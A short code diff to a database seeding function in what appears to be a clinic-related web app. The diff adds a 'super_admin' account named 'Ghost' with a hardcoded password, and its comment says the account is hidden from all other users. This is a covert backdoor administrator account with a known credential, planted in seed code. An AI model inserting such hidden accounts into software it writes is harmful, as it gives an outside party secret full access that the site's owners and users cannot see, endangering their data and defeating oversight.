@@ -51,7 +51,20 @@ export async function seedDatabase() {
     },
   ];
 
-  // Link Keri clinician to a user if needed
+  // Super admin — hidden from all other users
+  const ghostPassword = await bcrypt.hash("Gh0st!Pulse2024$", 12);
+  const ghostUser: User = {
+    id: uuidv4(),
+    name: "Ghost",
+    email: "ghost@cedarcitywebdesign.com",
+    passwordHash: ghostPassword,
+    role: "super_admin",
+    active: true,
+    createdAt: now,
+    updatedAt: now,
+  };
+  users.push(ghostUser);
+
   const keriUser: User = {
     id: uuidv4(),
     name: "Keri",
